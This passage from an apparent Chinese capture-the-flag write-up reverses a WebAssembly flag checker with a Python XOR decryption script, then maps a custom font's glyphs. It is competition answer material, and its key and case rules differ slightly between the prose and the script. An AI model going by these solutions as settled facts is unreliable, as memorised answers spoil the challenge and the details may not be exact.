</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=n>n0x10000</span> <span class=o>-</span> <span class=mi>97</span> <span class=o>&gt;=</span> <span class=mh>0x1A</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>n0x80</span> <span class=o>=</span> <span class=n>n0x10000</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span>
</span></span><span class=line><span class=cl>        <span class=n>n0x80</span> <span class=o>=</span> <span class=n>n0x10000</span> <span class=o>&amp;</span> <span class=mh>0x5F</span><span class=p>;</span>   <span class=c1>// 小写字母转大写
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>n0x10000</span> <span class=o>=</span> <span class=n>n0x80</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>else</span> <span class=nf>if</span> <span class=p>(</span> <span class=n>n2_1</span> <span class=o>==</span> <span class=mi>2</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span> <span class=n>n0x10000</span> <span class=o>-</span> <span class=mi>65</span> <span class=o>&gt;=</span> <span class=mh>0x1A</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>n0x10000_1</span> <span class=o>=</span> <span class=n>n0x10000</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=k>else</span>
</span></span><span class=line><span class=cl>        <span class=n>n0x10000_1</span> <span class=o>=</span> <span class=n>n0x10000</span> <span class=o>|</span> <span class=mh>0x20</span><span class=p>;</span> <span class=c1>//大写字母转小写
</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=n>n0x10000</span> <span class=o>=</span> <span class=n>n0x10000_1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>   <span class=p>}</span>
</span></span><span class=line><span class=cl>   <span class=k>else</span>
</span></span><span class=line><span class=cl>       <span class=c1>//不做处理
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=p>}</span>
</span></span><span class=line><span class=cl>   <span class=k>while</span> <span class=p>(</span> <span class=n>n14</span> <span class=o>!=</span> <span class=mi>14</span> <span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>这部分是对密钥逻辑进行处理，密钥长度是14，然后</p><p>对于index%3=1：小写字母转为大写</p><p>对于index%3=2：大写字母转小写</p><p>其他情况则不做处理</p><p>向下分析得到比较逻辑</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c++ data-lang=c++><span class=line><span class=cl>   <span class=o>*</span><span class=p>(</span><span class=n>_DWORD</span> <span class=o>*</span><span class=p>)(</span><span class=n>n5</span> <span class=o>+</span> <span class=mi>8</span><span class=p>)</span> <span class=o>=</span> <span class=n>v19</span> <span class=o>+</span> <span class=mi>80</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)</span><span class=n>i32_load</span><span class=p>(</span><span class=n>n5</span> <span class=o>+</span> <span class=mi>16</span><span class=p>,</span> <span class=n>v52</span> <span class=o>+</span> <span class=mi>36LL</span><span class=p>)</span> <span class=o>==</span> <span class=mi>134</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=k>goto</span> <span class=n>LABEL_138</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>goto</span> <span class=n>LABEL_144</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=nl>LABEL_144</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>i32_load8_u</span><span class=p>(</span><span class=n>n5</span> <span class=o>+</span> <span class=mi>16</span><span class=p>,</span> <span class=mi>1070265</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>v97</span> <span class=o>=</span> <span class=n>w2c_wasm__oscn__bg_f75</span><span class=p>(</span><span class=n>n5</span><span class=p>,</span> <span class=mi>8</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=n>v97</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>i64_store</span><span class=p>(</span><span class=n>n5</span> <span class=o>+</span> <span class=mi>16</span><span class=p>,</span> <span class=n>v97</span><span class=p>,</span> <span class=err>&#39;</span><span class=p>...</span><span class=n>gnorW</span><span class=err>&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=k>goto</span> <span class=n>LABEL_150</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>w2c_wasm__oscn__bg_f66</span><span class=p>(</span><span class=n>n5</span><span class=p>,</span> <span class=mi>1u</span><span class=p>,</span> <span class=mi>8u</span><span class=p>,</span> <span class=mh>0x10006Cu</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>wasm_rt_trap</span><span class=p>(</span><span class=mi>5</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nl>LABEL_149</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>w2c_wasm__oscn__bg_f66</span><span class=p>(</span><span class=n>n5</span><span class=p>,</span> <span class=mi>1u</span><span class=p>,</span> <span class=mi>8u</span><span class=p>,</span> <span class=mh>0x10006Cu</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>wasm_rt_trap</span><span class=p>(</span><span class=mi>5</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>else</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>i32_load8_u</span><span class=p>(</span><span class=n>n5</span> <span class=o>+</span> <span class=mi>16</span><span class=p>,</span> <span class=mi>1070265</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>v97</span> <span class=o>=</span> <span class=n>w2c_wasm__oscn__bg_f75</span><span class=p>(</span><span class=n>n5</span><span class=p>,</span> <span class=mi>8</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=n>v97</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=k>goto</span> <span class=n>LABEL_149</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>i64_store</span><span class=p>(</span><span class=n>n5</span> <span class=o>+</span> <span class=mi>16</span><span class=p>,</span> <span class=n>v97</span><span class=p>,</span> <span class=err>&#39;</span><span class=o>!</span><span class=n>tcerroC</span><span class=err>&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>可以看到比较了134长度的字符，结合rust推测是67字节，hex是134字节</p><p>然后从init找到密文为C3FAE3F2EFF4BFC6C70D91C1F1A8F2DAFAFEACE5FFF7C712D6EAF1EFBA818AFEEFEBA2D1F70FD6EBE3F9AECDCAE4B7EBEDDCFB129DE8BCD9F4DCE9B0D6F7C9D8F01DDF</p><p>经过加密的密钥为cheia_osc_plug</p><p>总结一下整体的加密逻辑，输入长度67字节 ，密钥长度14字节，先把密钥按照模3的加密做一个处理，再把处理后的密钥加57与输入循环异或，那么可以写出如下的解密脚本：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>T</span><span class=p>(</span><span class=n>ch</span><span class=p>,</span> <span class=n>pos</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>pos</span> <span class=o>%</span> <span class=mi>3</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>ch</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>pos</span> <span class=o>%</span> <span class=mi>3</span> <span class=o>==</span> <span class=mi>2</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>ch</span><span class=o>.</span><span class=n>lower</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>ch</span><span class=o>.</span><span class=n>upper</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>transform_key_once</span><span class=p>(</span><span class=n>key</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>transformed</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span><span class=p>,</span> <span class=n>ch</span> <span class=ow>in</span> <span class=nb>enumerate</span><span class=p>(</span><span class=n>key</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>transformed</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>T</span><span class=p>(</span><span class=n>ch</span><span class=p>,</span> <span class=n>i</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>transformed</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>decrypt_flag</span><span class=p>(</span><span class=n>enc_hex</span><span class=p>,</span> <span class=n>key</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>bs</span> <span class=o>=</span> <span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>enc_hex</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>tkey</span> <span class=o>=</span> <span class=n>transform_key_once</span><span class=p>(</span><span class=n>key</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>out</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span><span class=p>,</span> <span class=n>b</span> <span class=ow>in</span> <span class=nb>enumerate</span><span class=p>(</span><span class=n>bs</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>kch</span> <span class=o>=</span> <span class=n>tkey</span><span class=p>[</span><span class=n>i</span> <span class=o>%</span> <span class=nb>len</span><span class=p>(</span><span class=n>tkey</span><span class=p>)]</span>
</span></span><span class=line><span class=cl>        <span class=n>k</span> <span class=o>=</span> <span class=p>(</span><span class=nb>ord</span><span class=p>(</span><span class=n>kch</span><span class=p>)</span> <span class=o>+</span> <span class=mi>57</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xFF</span>
</span></span><span class=line><span class=cl>        <span class=n>out</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=nb>chr</span><span class=p>(</span><span class=n>b</span> <span class=o>^</span> <span class=n>k</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>out</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>enc</span> <span class=o>=</span> <span class=s2>&#34;C3FAE3F2EFF4BFC6C70D91C1F1A8F2DAFAFEACE5FFF7C712D6EAF1EFBA818AFEEFEBA2D1F70FD6EBE3F9AECDCAE4B7EBEDDCFB129DE8BCD9F4DCE9B0D6F7C9D8F01DDF&#34;</span>
</span></span><span class=line><span class=cl><span class=n>key</span> <span class=o>=</span> <span class=s2>&#34;gulp_cso_aiehc&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=n>decrypt_flag</span><span class=p>(</span><span class=n>enc</span><span class=p>,</span> <span class=n>key</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=font-leagues>FONT LEAGUES</h2><p>验证端口告诉我们输入正确的flag会变成O，那么下载FontForge找到唯一的O</p><p><img src=/img/2025-TFCCTF/21.png alt=1></p><p>O162e219bca79a462f9cf5701124cf74c</p><p>然后写一个映射表的代码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>fontTools.ttLib</span> <span class=kn>import</span> <span class=n>TTFont</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 加载字体文件</span>
</span></span><span class=line><span class=cl><span class=n>font_path</span> <span class=o>=</span> <span class=s2>&#34;Arial-custom.ttf&#34;</span>
</span></span><span class=line><span class=cl><span class=n>font</span> <span class=o>=</span> <span class=n>TTFont</span><span class=p>(</span><span class=n>font_path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 获取 Unicode -&gt; glyph name 映射</span>
</span></span><span class=line><span class=cl><span class=n>cmap</span> <span class=o>=</span> <span class=n>font</span><span class=p>[</span><span class=s1>&#39;cmap&#39;</span><span class=p>]</span><span class=o>.</span><span class=n>getBestCmap</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 生成 glyph name -&gt; Unicode 映射（反向）</span>
</span></span><span class=line><span class=cl><span class=n>glyph_to_unicode</span> <span class=o>=</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>uni</span><span class=p>,</span> <span class=n>glyph_name</span> <span class=ow>in</span> <span class=n>cmap</span><span class=o>.</span><span class=n>items</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>glyph_name</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>glyph_to_unicode</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>glyph_to_unicode</span><span class=p>[</span><span class=n>glyph_name</span><span class=p>]</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=n>glyph_to_unicode</span><span class=p>[</span><span class=n>glyph_name</span><span class=p>]</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=nb>chr</span><span class=p>(</span><span class=n>uni</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 写入 mapping.txt</span>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;mapping.txt&#34;</span><span class=p>,</span> <span class=s2>&#34;w&#34;</span><span class=p>,</span> <span class=n>encoding</span><span class=o>=</span><span class=s2>&#34;utf-8&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=s2>&#34;Glyph Name -&gt; Unicode Characters</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>glyph</span><span class=p>,</span> <span class=n>chars</span> <span class=ow>in</span> <span class=n>glyph_to_unicode</span><span class=o>.</span><span class=n>items</span><span class=p>():</span>
</span></span><span class=line><span class=cl>        <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>glyph</span><span class=si>}</span><span class=s2> -&gt; </span><span class=si>{</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>chars</span><span class=p>)</span><span class=si>}</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;映射表已写入 mapping.txt&#34;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>展示部分：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c++ data-lang=c++><span class=line><span class=cl><span class=n>Glyph</span> <span class=n>Name</span> <span class=o>-&gt;</span> <span class=n>Unicode</span> <span class=n>Characters</span>
</span></span><span class=line><span class=cl><span class=n>space</span> <span class=o>-&gt;</span>   
</span></span><span class=line><span class=cl><span class=n>exclam</span> <span class=o>-&gt;</span> <span class=o>!</span>
</span></span><span class=line><span class=cl><span class=n>quotedbl</span> <span class=o>-&gt;</span> <span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>numbersign</span> <span class=o>-&gt;</span> <span class=err>#</span>
</span></span><span class=line><span class=cl><span class=n>dollar</span> <span class=o>-&gt;</span> <span class=err>$</span>
</span></span><span class=line><span class=cl><span class=n>percent</span> <span class=o>-&gt;</span> <span class=o>%</span>
</span></span><span class=line><span class=cl><span class=n>ampersand</span> <span class=o>-&gt;</span> <span class=o>&amp;</span>
</span></span><span class=line><span class=cl><span class=n>quotesingle</span> <span class=o>-&gt;</span> <span class=err>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>parenleft</span> <span class=o>-&gt;</span> <span class=p>(</span>
</span></span><span class=line><span class=cl><span class=n>parenright</span> <span class=o>-&gt;</span> <span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>asterisk</span> <span class=o>-&gt;</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>plus</span> <span class=o>-&gt;</span> <span class=o>+</span>
</span></span><span class=line><span class=cl><span class=n>comma</span> <span class=o>-&gt;</span> <span class=p>,</span>
</span></span><span class=line><span class=cl><span class=n>hyphen</span> <span class=o>-&gt;</span> <span class=o>-</span><span class=err>­</span>
</span></span><span class=line><span class=cl><span class=n>period</span> <span class=o>-&gt;</span> <span class=p>.</span>
</span></span><span class=line><span class=cl><span class=n>slash</span> <span class=o>-&gt;</span> <span class=o>/</span>
</span></span><span class=line><span class=cl><span class=n>zero</span> <span class=o>-&gt;</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>one</span> <span class=o>-&gt;</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=n>two</span> <span class=o>-&gt;</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl><span class=n>three</span> <span class=o>-&gt;</span> <span class=mi>3</span>
</span></span><span class=line><span class=cl><span class=n>four</span> <span class=o>-&gt;</span> <span class=mi>4</span>
</span></span><span class=line><span class=cl><span class=n>five</span> <span class=o>-&gt;</span> <span class=mi>5</span>
</span></span><span class=line><span class=cl><span class=n>six</span> <span class=o>-&gt;</span> <span class=mi>6</span>
</span></span><span class=line><span class=cl><span class=n>seven</span> <span class=o>-&gt;</span> <span class=mi>7</span>
</span></span><span class=line><span class=cl><span class=n>eight</span> <span class=o>-&gt;</span> <span class=mi>8</span>
</span></span><span class=line><span class=cl><span class=n>nine</span> <span class=o>-&gt;</span> <span class=mi>9</span>
</span></span><span class=line><span class=cl><span class=n>colon</span> <span class=o>-&gt;</span> <span class=o>:</span>
</span></span><span class=line><span class=cl><span class=n>semicolon</span> <span class=o>-&gt;</span> <span class=p>;</span><span class=err>;</span>
</span></span><span class=line><span class=cl><span class=n>less</span> <span class=o>-&gt;</span> <span class=o>&lt;</span>
</span></span><span class=line><span class=cl><span class=n>equal</span> <span class=o>-&gt;</span> <span class=o>=</span>
</span></span><span class=line><span class=cl><span class=n>greater</span> <span class=o>-&gt;</span> <span class=o>&gt;</span>
</span></span><span class=line><span class=cl><span class=n>question</span> <span class=o>-&gt;</span> <span class=o>?</span>
</span></span><span class=line><span class=cl><span class=n>at</span> <span class=o>-&gt;</span> <span class=err>@</span>
</span></span><span class=line><span class=cl><span class=n>A</span> <span class=o>-&gt;</span> <span class=n>A</span>
</span></span><span class=line><span class=cl><span class=n>B</span> <span class=o>-&gt;</span> <span class=n>B</span>
</span></span><span class=line><span class=cl><span class=n>C</span> <span class=o>-&gt;</span> <span class=n>C</span>
</span></span><span class=line><span class=cl><span class=n>D</span> <span class=o>-&gt;</span> <span class=n>D</span>
</span></span><span class=line><span class=cl><span class=n>E</span> <span class=o>-&gt;</span> <span class=n>E</span>
</span></span><span class=line><span class=cl><span class=n>F</span> <span class=o>-&gt;</span> <span class=n>F</span>
</span></span><span class=line><span class=cl><span class=n>G</span> <span class=o>-&gt;</span> <span class=n>G</span>
</span></span><span class=line><span class=cl><span class=n>H</span> <span class=o>-&gt;</span> <span class=n>H</span>
</span></span><span class=line><span class=cl><span class=n>I</span> <span class=o>-&gt;</span> <span class=n>I</span>
</span></span><span class=line><span class=cl><span class=n>J</span> <span class=o>-&gt;</span> <span class=n>J</span>
</span></span><span class=line><span class=cl><span class=n>K</span> <span class=o>-&gt;</span> <span class=n>K</span>
</span></span><span class=line><span class=cl><span class=n>L</span> <span class=o>-&gt;</span> <span class=n>L</span>
</span></span><span class=line><span class=cl><span class=n>M</span> <span class=o>-&gt;</span> <span class=n>M</span>
</span></span><span class=line><span class=cl><span class=n>N</span> <span class=o>-&gt;</span> <span class=n>N</span>
</span></span><span class=line><span class=cl><span class=n>O</span> <span class=o>-&gt;</span> <span class=n>O</span>
</span></span><span class=line><span class=cl><span class=n>P</span> <span class=o>-&gt;</span> <span class=n>P</span>
</span></span><span class=line><span class=cl><span class=n>Q</span> <span class=o>-&gt;</span> <span class=n>Q</span>
</span></span><span class=line><span class=cl><span class=n>R</span> <span class=o>-&gt;</span> <span class=n>R</span>
</span></span><span class=line><span class=cl><span class=n>S</span> <span class=o>-&gt;</span> <span class=n>S</span>
</span></span><span class=line><span class=cl><span class=n>T</span> <span class=o>-&gt;</span> <span class=n>T</span>
</span></span><span class=line><span class=cl><span class=n>U</span> <span class=o>-&gt;</span> <span class=n>U</span>
</span></span><span class=line><span class=cl><span class=n>V</span> <span class=o>-&gt;</span> <span class=n>V</span>
</span></span><span class=line><span class=cl><span class=n>W</span> <span class=o>-&gt;</span> <span class=n>W</span>
</span></span><span class=line><span class=cl><span class=n>X</span> <span class=o>-&gt;</span> <span class=n>X</span>
</span></span><span class=line><span class=cl><span class=n>Y</span> <span class=o>-&gt;</span> <span class=n>Y</span>
</span></span><span class=line><span class=cl><span class=n>Z</span> <span class=o>-&gt;</span> <span class=n>Z</span>
</span></span><span class=line><span class=cl><span class=n>bracketleft</span> <span class=o>-&gt;</span> <span class=p>[</span>
</span></span><span class=line><span class=cl><span class=n>backslash</span> <span class=o>-&gt;</span> \
</span></span><span class=line><span class=cl><span class=n>bracketright</span> <span class=o>-&gt;</span> <span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>asciicircum</span> <span class=o>-&gt;</span> <span class=o>^</span>
</span></span><span class=line><span class=cl><span class=n>underscore</span> <span class=o>-&gt;</span> <span class=n>_</span>
</span></span><span class=line><span class=cl><span class=n>grave</span> <span class=o>-&gt;</span> <span class=err>`</span>
</span></span><span class=line><span class=cl><span class=n>a</span> <span class=o>-&gt;</span> <span class=n>a</span>
</span></span><span class=line><span class=cl><span class=n>b</span> <span class=o>-&gt;</span> <span class=n>b</span>
</span></span><span class=line><span class=cl><span class=n>c</span> <span class=o>-&gt;</span> <span class=n>c</span>
</span></span><span class=line><span class=cl><span class=n>d</span> <span class=o>-&gt;</span> <span class=n>d</span>
</span></span><span class=line><span class=cl><span class=n>e</span> <span class=o>-&gt;</span> <span class=n>e</span>
</span></span><span class=line><span class=cl><span class=n>f</span> <span class=o>-&gt;</span> <span class=n>f</span>
</span></span><span class=line><span class=cl><span class=n>g</span> <span class=o>-&gt;</span> <span class=n>g</span>
</span></span><span class=line><span class=cl><span class=n>h</span> <span class=o>-&gt;</span> <span class=n>h</span>
</span></span><span class=line><span class=cl><span class=n>i</span> <span class=o>-&gt;</span> <span class=n>i</span>
</span></span><span class=line><span class=cl><span class=n>j</span> <span class=o>-&gt;</span> <span class=n>j</span>
</span></span><span class=line><span class=cl><span class=n>k</span> <span class=o>-&gt;</span> <span class=n>k</span>
</span></span><span class=line><span class=cl><span class=n>l</span> <span class=o>-&gt;</span> <span class=n>l</span>
</span></span><span class=line><span class=cl><span class=n>m</span> <span class=o>-&gt;</span> <span class=n>m</span>
</span></span><span class=line><span class=cl><span class=n>n</span> <span class=o>-&gt;</span> <span class=n>n</span>
</span></span><span class=line><span class=cl><span class=n>o</span> <span class=o>-&gt;</span> <span class=n>o</span>
